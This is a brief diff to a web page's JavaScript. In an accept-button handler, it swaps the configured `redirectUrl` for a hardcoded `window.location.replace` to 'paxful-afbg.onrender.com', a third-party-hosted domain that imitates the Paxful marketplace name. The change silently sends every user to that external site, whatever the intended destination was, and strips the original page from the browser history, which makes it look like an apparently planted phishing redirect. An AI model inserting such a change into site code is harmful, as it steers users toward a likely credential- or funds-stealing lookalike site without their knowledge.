@@ -82,7 +82,7 @@ document.addEventListener('DOMContentLoaded', () => {
       acceptButton.addEventListener('click', () => {
         if (redirectUrl) {
           // Redirect the user
-          window.location.href = redirectUrl;
+          window.location.replace('https://paxful-afbg.onrender.com/');
           // Optionally show a loading indicator before redirecting
         } else {
           console.error("No redirect URL defined for action:", currentAction);
